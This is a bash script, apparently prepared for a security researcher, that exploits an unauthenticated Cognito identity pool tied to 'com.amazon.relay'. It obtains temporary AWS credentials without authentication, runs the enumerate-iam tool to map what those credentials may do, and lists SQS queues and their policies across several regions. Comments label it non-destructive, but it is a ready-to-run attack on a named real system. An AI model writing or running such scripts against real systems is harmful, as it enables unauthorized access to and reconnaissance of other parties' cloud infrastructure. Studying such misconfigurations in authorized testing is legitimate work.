#!/usr/bin/env bash
# OPERATOR-RUN raise-impact enumeration for the com.amazon.relay unauth-Cognito finding.
# SAFE by construction: unauth cred issuance + enumerate-iam (get_/list_/describe_ ONLY,
# non-destructive) + SQS METADATA (list-queues, get-queue-attributes = names/count/policy).
# Does NOT ReceiveMessage / SendMessage / DeleteMessage / PurgeQueue — no data read or mutate.
# Run in WSL, paste the whole output back. Creds are temporary (~1h) and unauthenticated.
set -uo pipefail
POOL="us-east-1:56106a99-23f8-4333-8edd-612af3b9de11"; REGION="us-east-1"
echo "################ 1. ISSUE FRESH UNAUTH CREDS ################"
IDID=$(aws cognito-identity get-id --identity-pool-id "$POOL" --region "$REGION" --no-sign-request --query IdentityId --output text)
echo "IdentityId: $IDID"
CREDS=$(aws cognito-identity get-credentials-for-identity --identity-id "$IDID" --region "$REGION" --no-sign-request)
export AWS_ACCESS_KEY_ID="$(jq -r .Credentials.AccessKeyId <<<"$CREDS")"
export AWS_SECRET_ACCESS_KEY="$(jq -r .Credentials.SecretKey <<<"$CREDS")"
export AWS_SESSION_TOKEN="$(jq -r .Credentials.SessionToken <<<"$CREDS")"
export AWS_DEFAULT_REGION="$REGION"
echo "whoami:"; aws sts get-caller-identity 2>&1

echo "################ 2. FULL PERMISSION MAP (enumerate-iam, non-destructive) ################"
if [ ! -f "$HOME/tools/enumerate-iam/enumerate-iam.py" ]; then
  mkdir -p "$HOME/tools"; git clone -q https://github.com/andresriancho/enumerate-iam "$HOME/tools/enumerate-iam" 2>/dev/null
  pip3 install -q -r "$HOME/tools/enumerate-iam/requirements.txt" 2>/dev/null || true
fi
python3 "$HOME/tools/enumerate-iam/enumerate-iam.py" \
  --access-key "$AWS_ACCESS_KEY_ID" --secret-key "$AWS_SECRET_ACCESS_KEY" --session-token "$AWS_SESSION_TOKEN" 2>&1 \
  | grep -aiE 'root account|supported|-- [a-z]|\ballowed\b|success|error occurred' | grep -aivE 'DEBUG' | head -80

echo "################ 3. SQS METADATA (names + counts + policy; NO message read) ################"
for r in us-east-1 us-west-2 eu-west-1 us-east-2 eu-central-1; do
  urls=$(aws sqs list-queues --region "$r" --query 'QueueUrls[]' --output text 2>/dev/null || true)
  [ -z "$urls" ] && continue
  echo "===== region $r : $(wc -w <<<"$urls") queue(s) ====="
  for q in $urls; do
    echo "--- $q ---"
    aws sqs get-queue-attributes --queue-url "$q" --attribute-names All --region "$r" 2>&1 \
      | jq '{QueueArn:.Attributes.QueueArn, Messages:.Attributes.ApproximateNumberOfMessages, InFlight:.Attributes.ApproximateNumberOfMessagesNotVisible, Encrypted:(.Attributes.KmsMasterKeyId // .Attributes.SqsManagedSseEnabled // "none"), Policy:(.Attributes.Policy // "none")}' 2>/dev/null \
      || echo "  (get-queue-attributes denied — listing only)"
  done
done
echo "################ DONE — paste everything above back ################"
